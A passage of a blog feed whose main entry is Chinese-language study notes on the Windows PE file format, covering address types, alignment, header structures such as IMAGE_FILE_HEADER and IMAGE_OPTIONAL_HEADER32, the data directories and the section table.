&lt;figure class=&quot;highlight c&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;字符: A, ASCII码: &lt;span class=&quot;number&quot;&gt;65&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/blockquote&gt;</summary>
    
    
    
    
    <category term="编码" scheme="http://example.com/tags/%E7%BC%96%E7%A0%81/"/>
    
  </entry>
  
  <entry>
    <title>PElearn</title>
    <link href="http://example.com/2025/05/29/PElearn/"/>
    <id>http://example.com/2025/05/29/PElearn/</id>
    <published>2025-05-29T13:31:56.000Z</published>
    <updated>2025-06-04T12:27:22.583Z</updated>
    
    <content type="html"><![CDATA[<h1 id="PE-学习笔记-一"><a href="#PE-学习笔记-一" class="headerlink" title="PE 学习笔记(一)"></a>PE 学习笔记(一)</h1><p>先来几张图片放在最前面</p><p><img src="/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%841.jpeg" alt="PE结构1"></p><p><img src="/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%842.jpeg" alt="PE结构2"></p><p><img src="/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%843.png" alt="PE结构3"></p><span id="more"></span><h2 id="引言"><a href="#引言" class="headerlink" title="引言"></a>引言</h2><p>本帖子大部分出自书籍 《Windows PE权威指南》因需要复习PE知识 故此记录</p><h2 id="地址"><a href="#地址" class="headerlink" title="地址"></a>地址</h2><p>地址有四类，它们分别是：<br><strong>虚拟内存地址（VA)</strong><br><strong>相对虚拟内存地址（RVA）</strong><br><strong>文件偏移地址（FOA)</strong><br><strong>特殊地址</strong></p><h6 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h6><blockquote><p>32 位环境下的Windows内存管理<br>32位CPU的寻址能力为4GB（即2²个字节)，但有些用户的物理内存达不到这个值。<br>于是操作系统和CPU的内存管理单元共同作用，为用户提供了虚拟内存的管理机制。即分页机制。该机制可以让用户感觉自己好像在使用4GB的内存。</p><p>分页机制的基本原理是：<br>操作系统假设一个进程独立拥有4GB内存，按照某个固定的大小（如4KB）将这4GB空间分成N（1M）个页。在某一时刻，所有这些页只有一部分和物理内存是对应的（所以这种机制允许物理内存比4GB小)。没有物理内存对应的页面被标记为脏(dirty)的页面，一般存储在一个名为“交换文件”的磁盘文件中。在WindowsXP系统中，交换文件为pagefile.sys，它位于系统盘的根目录，是一个系统隐藏文件。当系统需要读取未在内存中的数据时，这部分数据会将内存中不经常读写的页交换出内存，而把要读取的、位于交换文件中的页换进内存。通过这种存取机制可以让一个进程拥有比实际内存大得多的内存。利用这种机制管理的<br>内存称为虚拟内存。</p></blockquote><h2 id="虚拟内存地址"><a href="#虚拟内存地址" class="headerlink" title="虚拟内存地址"></a>虚拟内存地址</h2><p><strong>VA &#x3D; 进程基地址+相对虚拟内存地址</strong></p><h2 id="相对虚拟内存地址"><a href="#相对虚拟内存地址" class="headerlink" title="相对虚拟内存地址"></a>相对虚拟内存地址</h2><p><strong>RVA &#x3D; 某个特定位置距离某个模块基地址的偏移量</strong></p><h3 id="关于VA和RVA的概念如图所示"><a href="#关于VA和RVA的概念如图所示" class="headerlink" title="关于VA和RVA的概念如图所示"></a>关于VA和RVA的概念如图所示</h3><p><img src="/2025/05/29/PElearn/%E5%86%85%E5%AD%98%E5%9C%B0%E5%9D%80%E7%A4%BA%E6%84%8F%E5%9B%BE.png" alt="内存地址示意图.png"></p><p>假设模块2的基地址为0x01000000，而模块2中的某个位置距离模块2的基地址偏移为400h，那么值0x00000400就是模块2中某个位置的RVA，而值0x01000400是该位置的VA。记住，RVA是相对于模块而言的，VA是相对于整个地址空间而言的。注意RVA与具体模块相关，它有一个范围，该范围从模块的开始到模块结束，脱离开这个范围的RVA是无效的，称为越界。越界的RVA地址没有任何意义。</p><h2 id="文件偏移地址"><a href="#文件偏移地址" class="headerlink" title="文件偏移地址"></a>文件偏移地址</h2><p>文件偏移地址(File Offset Address, FOA) 和内存无关，它是<strong>指某个位置距离文件头的偏移。</strong></p><h2 id="特殊地址"><a href="#特殊地址" class="headerlink" title="特殊地址"></a>特殊地址</h2><p>比较少见</p><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="数据目录"><a href="#数据目录" class="headerlink" title="数据目录"></a>数据目录</h3><ul><li>导出表</li><li>导入表</li><li>资源表</li><li>异常表</li><li>属性证书表</li><li>重定位表</li><li>调试数据</li><li>Architecture</li><li>Global Ptr</li><li>线程局部存储</li><li>加载配置表</li><li>绑定导入表</li><li>IAT</li><li>延时导入表</li><li>CLR运行时头部</li></ul><h3 id="节"><a href="#节" class="headerlink" title="节"></a>节</h3><p>主要是用来存放不同类型数据(代码、数据、常量、资源等) 不同节有不同的访问权限</p><h3 id="对齐"><a href="#对齐" class="headerlink" title="对齐"></a>对齐</h3><p>数据在内存中的对齐、数据在文件中的对齐、资源文件中资源数据的对齐</p><h4 id="内存对齐"><a href="#内存对齐" class="headerlink" title="内存对齐"></a>内存对齐</h4><p><strong>节在内存中的对齐单位必须至少是一个页的大小 32位 &#x3D; 4kb (1000h) 64位&#x3D;8kb (2000h)</strong></p><h4 id="文件对齐"><a href="#文件对齐" class="headerlink" title="文件对齐"></a>文件对齐</h4><p><strong>节在文件中的对齐要小于内存中的对齐 通常会以一个物理扇区的大小作为对齐粒度的值也就是512字节 十六进制表示 (200h)</strong></p><p>出于节约资源的考虑，<strong>操作系统允许节在内存和文件中的对齐尺寸不一致</strong>。这就直接造成了<strong>PE在文件中和在内存中的大小也会不一致</strong>。通常情况下，<strong>PE在内存中的尺寸要比在文件中的尺寸大</strong>。用户可以自己定义这些对齐的值。</p><p><strong>如果内存对齐被定义为小于操作系统页的大小，则文件对齐和内存对齐的值必须一致！</strong></p><h4 id="资源数据对齐"><a href="#资源数据对齐" class="headerlink" title="资源数据对齐"></a>资源数据对齐</h4><p>资源文件中，资源字节码部分一般要求以双字（4个字节）方式对齐</p><h1 id="PE文件结构"><a href="#PE文件结构" class="headerlink" title="PE文件结构"></a>PE文件结构</h1><p><img src="/2025/05/29/PElearn/image-20250530200634595.png" alt="Windows DOS头 结构体"></p><p>在十六位系统中 PE头和PE结构数据被当成是冗余数据 在32位系统中 刚好相反 即DOS头成为冗余数据 所谓冗余 是针对DOS头不参与 32位系统运行过程而言 尽管该部分不参与运行 但也不能把这些数据从PE结构中出去 因为<code>DOS MZ</code>头中有一个字段非常重要 即 <code>IMAGE_DOS_HEADER.e_lfanew</code> 没有他操作系统就定位不到标准的PE头部 可执行程序也就会被操作系统认为是非法的PE映像</p><p>定位标准PE头</p><p>由于DOS Stub的长度不固定 导致了DOS头也不是一个固定大小的数据结构 那么在WindowsPE中 既然把DOS头放在了PE的起始位置 如果去定位后面的标准PE头所在的位置呢 字段e_lfanew 即起这个作用 该字段的值是一个 <strong>相对偏移量</strong> 相对定位时需要加上DOS MZ 头的基地址 也就是说 通过以下公式可以得到PE头的绝对位置 </p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PE_start = DOS MZ 基地址 + IMAGE_DOS_HEADER.e_lfanew</span><br></pre></td></tr></table></figure><p><img src="/2025/05/29/PElearn/image-20250530201624808.png" alt="PE结构划分"></p><p>大概分为五个部分 <code>DOS MZ头</code> <code>DOS Stub</code> <code>PE头</code> <code>节表</code> <code>节内容</code></p><p>PE头是由 IMAGE_FILE_HEADER.SizeOfOptionalHeader 来确定大小的</p><p>节的数量是由字段 IMAGE_FILE_HEADER.NumberOfSections来定义的 DOS Stub和节内容都是大小不确定的</p><p>节的内容大小不确定</p><p><img src="/2025/05/29/PElearn/image-20250530202216573.png" alt="程序员眼中的PE结构"></p><p>一个标准的PE文件一般由四大部分组成:</p><ol><li>DOS头</li><li>PE头</li><li>节表</li><li>节内容</li></ol><p><img src="/2025/05/29/PElearn/image-20250530202544824.png" alt="DOS头"></p><p>紧跟在DOS stub后面的是PE头标识 <code>Signature </code>与大部分文件格式的头部结构一样 PE头部信息中有一个四字节的标识 该标识位于指针IMAGE_DOS_HEADER.e_lfanew 指向的位置 其内容固定 对应于ASCII码的字符串 “PE\0\0”</p><h1 id="标准PE头-IMAGE-FILE-HEADER"><a href="#标准PE头-IMAGE-FILE-HEADER" class="headerlink" title="标准PE头 IMAGE_FILE_HEADER"></a>标准PE头 IMAGE_FILE_HEADER</h1><p>紧跟在PE头标识后 即位于IMAGE_DOS_HEADER 的 e_lfanew值+4的位置 由此位置开始的20个字节为数据结构标准PE头IMAGE_FILE_HEADER的内容 该结构在微软的官方文档中被称为<strong>标准通用对象文件格式 (Common Object File Format COFF)头 它记录了PE文件的全局属性</strong></p><p>例如 PE文件的运行平台、PE文件类型、文件中存在节的总数等 定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_FILE_HEADER</span> &#123;</span><br><span class="line">  WORD  Machine;<span class="comment">// 平台</span></span><br><span class="line">  WORD  NumberOfSections;<span class="comment">// pe中节的数量</span></span><br><span class="line">  DWORD TimeDateStamp;<span class="comment">// 文件创建日期和时间</span></span><br><span class="line">  DWORD PointerToSymbolTable;<span class="comment">// 指向符号表(用于调试)</span></span><br><span class="line">  DWORD NumberOfSymbols;<span class="comment">// 符号表中的符号数量(用于调试)</span></span><br><span class="line">  WORD  SizeOfOptionalHeader;<span class="comment">// 扩展头结构的长度</span></span><br><span class="line">  WORD  Characteristics;<span class="comment">// 文件属性</span></span><br><span class="line">&#125; IMAGE_FILE_HEADER, *PIMAGE_FILE_HEADER;</span><br></pre></td></tr></table></figure><p>该结构可以用于判断PE文件是EXE还是DLL类型 不但可以通过该结构得到PE文件中节的总量，还可以当成对节区信息进行遍历操作时的循环次数</p><p><img src="/2025/05/29/PElearn/PE%E6%96%87%E4%BB%B6%E7%B1%BB%E5%9E%8B%E8%A1%A8.png" alt="PE平台类型表"></p><p><img src="/2025/05/29/PElearn/%E6%96%87%E4%BB%B6%E5%B1%9E%E6%80%A7%E8%A1%A8.png" alt="PE文件属性表"></p><h1 id="扩展PE头-IMAGE-OPTIONAL-HEADER32"><a href="#扩展PE头-IMAGE-OPTIONAL-HEADER32" class="headerlink" title="扩展PE头 IMAGE_OPTIONAL_HEADER32"></a>扩展PE头 IMAGE_OPTIONAL_HEADER32</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_OPTIONAL_HEADER</span> &#123;</span><br><span class="line">  WORD                 Magic;<span class="comment">// 魔术字</span></span><br><span class="line">  BYTE                 MajorLinkerVersion;<span class="comment">// 链接器版本号</span></span><br><span class="line">  BYTE                 MinorLinkerVersion;<span class="comment">// 连接器次版本号</span></span><br><span class="line">  DWORD                SizeOfCode;<span class="comment">// 所有含代码的节的总大小</span></span><br><span class="line">  DWORD                SizeOfInitializedData;<span class="comment">// 所以含已初始化数据的节的总大小</span></span><br><span class="line">  DWORD                SizeOfUninitializedData;<span class="comment">// 所有含未初始化数据的节的大小</span></span><br><span class="line">  DWORD                AddressOfEntryPoint;<span class="comment">// 程序执行入口 RVA</span></span><br><span class="line">  DWORD                BaseOfCode;<span class="comment">// 代码的节的起始RVA</span></span><br><span class="line">  DWORD                BaseOfData;<span class="comment">// 数据的节的起始RVA</span></span><br><span class="line">  DWORD                ImageBase;<span class="comment">// 程序的建议装载地址</span></span><br><span class="line">  DWORD                SectionAlignment;<span class="comment">// 内存中节的对齐粒度</span></span><br><span class="line">  DWORD                FileAlignment;<span class="comment">// 文件中节的对齐粒度</span></span><br><span class="line">  WORD                 MajorOperatingSystemVersion;<span class="comment">// 操作系统的版本号</span></span><br><span class="line">  WORD                 MinorOperatingSystemVersion;<span class="comment">// 操作系统的次版本号</span></span><br><span class="line">  WORD                 MajorImageVersion;<span class="comment">// 该PE的版本号</span></span><br><span class="line">  WORD                 MinorImageVersion;<span class="comment">// 该PE的次版本号</span></span><br><span class="line">  WORD                 MajorSubsystemVersion;<span class="comment">// 所需子系统的版本号</span></span><br><span class="line">  WORD                 MinorSubsystemVersion;<span class="comment">// 所需子系统的次版本号</span></span><br><span class="line">  DWORD                Win32VersionValue;<span class="comment">// 未用</span></span><br><span class="line">  DWORD                SizeOfImage;<span class="comment">// 内存中整个PE映像的尺寸</span></span><br><span class="line">  DWORD                SizeOfHeaders;<span class="comment">// 所有头+节表的大小</span></span><br><span class="line">  DWORD                CheckSum;<span class="comment">// 校验和</span></span><br><span class="line">  WORD                 Subsystem;<span class="comment">// 文件的子系统</span></span><br><span class="line">  WORD                 DllCharacteristics;<span class="comment">// DLL文件特征</span></span><br><span class="line">  DWORD                SizeOfStackReserve;<span class="comment">// 初始化时的栈大小</span></span><br><span class="line">  DWORD                SizeOfStackCommit;<span class="comment">// 初始化时实际提交的栈大小</span></span><br><span class="line">  DWORD                SizeOfHeapReserve;<span class="comment">// 初始化时保留的堆大小</span></span><br><span class="line">  DWORD                SizeOfHeapCommit;<span class="comment">// 初始化时实际提交的堆大小</span></span><br><span class="line">  DWORD                LoaderFlags;<span class="comment">// 与调试有关</span></span><br><span class="line">  DWORD                NumberOfRvaAndSizes;<span class="comment">// 下面的数据目录结构的项目数量</span></span><br><span class="line">  IMAGE_DATA_DIRECTORY DataDirectory[IMAGE_NUMBEROF_DIRECTORY_ENTRIES]; <span class="comment">//数据目录</span></span><br><span class="line">&#125; IMAGE_OPTIONAL_HEADER32, *PIMAGE_OPTIONAL_HEADER32;</span><br></pre></td></tr></table></figure><p>文件执行的入口 文件被操作系统装入内存后的默认基地址 以及节在磁盘和内存中的对齐单位等信息 均可在此结构中找到 对该结构的某些数值改动都可以会造成PE文件的加载或运行失败</p><h1 id="IMAGE-NT-HEADERS"><a href="#IMAGE-NT-HEADERS" class="headerlink" title="IMAGE_NT_HEADERS"></a>IMAGE_NT_HEADERS</h1><p>这个结构广义上的PE头 在标准PE文件中其大小为456个字节 他是以上两种结构的组好 即</p><p>IMAGE_NT_HEADERS &#x3D; 4个字节的PE标识 + IMAGE_FILE_HEADER+IMAGE_OPTIONAL_HEADER32</p><p><img src="/2025/05/29/PElearn/image-20250530210301652.png" alt="PE结构"></p><p>该结构的详细定义如下：</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_NT_HEADERS</span> &#123;</span><br><span class="line">  DWORD                   Signature;<span class="comment">// PE头标识</span></span><br><span class="line">  IMAGE_FILE_HEADER       FileHeader;<span class="comment">// PE标准头</span></span><br><span class="line">  IMAGE_OPTIONAL_HEADER32 OptionalHeader;<span class="comment">// PE扩展头</span></span><br><span class="line">&#125; IMAGE_NT_HEADERS32, *PIMAGE_NT_HEADERS32;</span><br></pre></td></tr></table></figure><p>与DOS头一样 PE头开始也是一个标志 用一个双字的 “PE\0\0” 来命名 这也是PE头的由来</p><h1 id="数据目录项-IMAGE-DATA-DIRECTORY"><a href="#数据目录项-IMAGE-DATA-DIRECTORY" class="headerlink" title="数据目录项 IMAGE_DATA_DIRECTORY"></a>数据目录项 IMAGE_DATA_DIRECTORY</h1><p>IMAGE_OPTIONAL_HEADER32(扩展PE头) 结构的最后一个字段为 <code>DataDriectory</code></p><p>该字段定义了PE文件中出现的所有不同类型的数据和目录信息 如前所述 应用程序中的数据被按照用途分成很多种类 <code>导出表、导入表、资源、重定位等</code> 在内存中，这些数据被<strong>操作系统以页为单位组织起来</strong>，并赋予不同的访问属性，在文件中，<strong>这些数据也同样被组织起来</strong>，按照<strong>不同类型分别存放在文件的指定位置，该结构就是用来描述这些不同类型的数据在文件(和内存)中位置及大小的</strong></p><p>该数据目录中定义的数据类型一直是16种</p><p>PE种使用了一种称作 “数据目录项 IMAGE_DATA_DIRECTORY” 的数据结构来定义每种数据</p><p>该结构如下所示 只有两个字段</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_DATA_DIRECTORY</span> &#123;</span><br><span class="line">  DWORD VirtualAddress;<span class="comment">// 数据的起始 RVA</span></span><br><span class="line">  DWORD Size;<span class="comment">// 数据块的长度</span></span><br><span class="line">&#125; IMAGE_DATA_DIRECTORY, *PIMAGE_DATA_DIRECTORY;</span><br></pre></td></tr></table></figure><p>总的数据目录一共由16个相同的 IMAGE_DATA_DIRECTORY 结构连续排列在一起组成</p><p><img src="/2025/05/29/PElearn/image-20250530211044549.png" alt="数据目录结构示意图"></p><table><thead><tr><th>索引</th><th>名称</th><th>说明</th></tr></thead><tbody><tr><td>0</td><td>Export Table</td><td>导出表（程序导出的函数信息）</td></tr><tr><td>1</td><td>Import Table</td><td>导入表（程序导入的 DLL 和函数）</td></tr><tr><td>2</td><td>Resource Table</td><td>资源表（图标、对话框、字符串等）</td></tr><tr><td>3</td><td>Exception Table</td><td>异常处理表（SEH）</td></tr><tr><td>4</td><td>Certificate Table</td><td>数字签名证书表</td></tr><tr><td>5</td><td>Base Relocation</td><td>重定位表（Address Fixups）</td></tr><tr><td>6</td><td>Debug Directory</td><td>调试信息表（符号等）</td></tr><tr><td>7</td><td>Architecture</td><td>保留（未使用）</td></tr><tr><td>8</td><td>GlobalPtr</td><td>全局指针（MIPS）</td></tr><tr><td>9</td><td>TLS Table</td><td>TLS 初始化数据表（线程本地存储）</td></tr><tr><td>10</td><td>Load Config Table</td><td>加载配置表（安全设置等）</td></tr><tr><td>11</td><td>Bound Import</td><td>绑定导入表（提前绑定信息）</td></tr><tr><td>12</td><td>IAT</td><td>导入地址表（Import Address Table）</td></tr><tr><td>13</td><td>Delay Import</td><td>延迟导入表（延迟加载 DLL）</td></tr><tr><td>14</td><td>COM Descriptor</td><td>CLR 运行时头（托管程序）</td></tr><tr><td>15</td><td>Reserved</td><td>保留</td></tr></tbody></table><figure class="highlight css"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">IMAGE_OPTIONAL_HEADER</span><br><span class="line">├── ...</span><br><span class="line">├── IMAGE_DATA_DIRECTORY DataDirectory<span class="selector-attr">[16]</span></span><br><span class="line">│   ├── DataDirectory<span class="selector-attr">[0]</span>  → Export <span class="selector-tag">Table</span></span><br><span class="line">│   ├── DataDirectory<span class="selector-attr">[1]</span>  → Import <span class="selector-tag">Table</span></span><br><span class="line">│   ├── DataDirectory<span class="selector-attr">[2]</span>  → Resource <span class="selector-tag">Table</span></span><br><span class="line">│   └── ...</span><br></pre></td></tr></table></figure><p>常用的数据目录的用途如下：</p><table><thead><tr><th>数据目录项</th><th>作用</th></tr></thead><tbody><tr><td>导入表</td><td>找到程序依赖的 DLL 和函数</td></tr><tr><td>导出表</td><td>提供外部调用函数的信息（如 DLL 导出函数）</td></tr><tr><td>资源表</td><td>程序图标、对话框等 GUI 元素</td></tr><tr><td>重定位表</td><td>可执行文件在加载时修正地址</td></tr><tr><td>TLS 表</td><td>多线程支持的线程本地变量数据</td></tr><tr><td>COM 描述符</td><td>.NET 程序的入口点（托管程序）</td></tr></tbody></table><p>如果想在PE文件种寻找特定类型的数据 就需要从该结构开始</p><p><strong>该结构每个字段后的偏移都是基于 IMAGE_NT_HEADERS 头的</strong></p><h1 id="节表项-IMAGE-SECTION-HEADER"><a href="#节表项-IMAGE-SECTION-HEADER" class="headerlink" title="节表项 IMAGE_SECTION_HEADER"></a>节表项 IMAGE_SECTION_HEADER</h1><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="keyword">struct</span> <span class="title class_">_IMAGE_SECTION_HEADER</span> &#123;</span><br><span class="line">  BYTE  Name[IMAGE_SIZEOF_SHORT_NAME];<span class="comment">// 8个字节节名</span></span><br><span class="line">  <span class="keyword">union</span> &#123;</span><br><span class="line">    DWORD PhysicalAddress;</span><br><span class="line">    DWORD VirtualSize;<span class="comment">// 节区的尺寸</span></span><br><span class="line">  &#125; Misc;</span><br><span class="line">  DWORD VirtualAddress;<span class="comment">// 节区的RVA地址</span></span><br><span class="line">  DWORD SizeOfRawData;<span class="comment">// 在文件中对齐后的尺寸</span></span><br><span class="line">  DWORD PointerToRawData;<span class="comment">// 在文件中的偏移</span></span><br><span class="line">  DWORD PointerToRelocations;<span class="comment">// 在OBJ文件中使用</span></span><br><span class="line">  DWORD PointerToLinenumbers;<span class="comment">// 行号表的位置(供调试使用)</span></span><br><span class="line">  WORD  NumberOfRelocations;<span class="comment">// 在OBJ文件中使用</span></span><br><span class="line">  WORD  NumberOfLinenumbers;<span class="comment">// 行号表中行号的数量</span></span><br><span class="line">  DWORD Characteristics;<span class="comment">// 节的属性</span></span><br><span class="line">&#125; IMAGE_SECTION_HEADER, *PIMAGE_SECTION_HEADER;</span><br></pre></td></tr></table></figure><p><strong>该偏移是基于 IMAGE_SECTION_HEADER 头的</strong></p><h1 id="PE头-IMAGE-NT-HEADER-字段"><a href="#PE头-IMAGE-NT-HEADER-字段" class="headerlink" title="PE头 IMAGE_NT_HEADER 字段"></a>PE头 IMAGE_NT_HEADER 字段</h1><ol><li>Signature 双字 PE文件标识 被定义为 4550h 也就是 PE 再加上两个00 这就是PE这个称呼的由 如果更改其中的任何一个字节操作系统就无法把该文件识别为正确的PE文件 通过修改这个字段 会导致PE文件在32为系统中加载失败 但由于文件的其他部分(特别是DOS头)并没有被破坏 系统还是可以识别出其为DOS系统下的可执行程序 并通过调用纯DOS环境来运行 DOS stub中的程序代码 如果你确认操作系统中某个PE文件携带病毒 并且开机会被加载到内存运行 最简单的处理办法是通过WINDOWS PE盘启动系统 在系统中找到病毒文件 使用记事本简单地修改其中任何一个字符 保存文件 重新开机启动后即可防止病毒文件被加载 此PE非彼PE windows PE是一个操作系统 其全称是 Windows Perinstallation Environment 即 Windows的预安装环境 该操作系统区别于 Windows XP&#x2F;2000&#x2F;Vista 等 可以从光盘引导</li></ol>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;PE-学习笔记-一&quot;&gt;&lt;a href=&quot;#PE-学习笔记-一&quot; class=&quot;headerlink&quot; title=&quot;PE 学习笔记(一)&quot;&gt;&lt;/a&gt;PE 学习笔记(一)&lt;/h1&gt;&lt;p&gt;先来几张图片放在最前面&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%841.jpeg&quot; alt=&quot;PE结构1&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%842.jpeg&quot; alt=&quot;PE结构2&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;/2025/05/29/PElearn/PE%E7%BB%93%E6%9E%843.png&quot; alt=&quot;PE结构3&quot;&gt;&lt;/p&gt;</summary>
    
    
    
    
    <category term="PE" scheme="http://example.com/tags/PE/"/>
    
  </entry>
  
</feed>
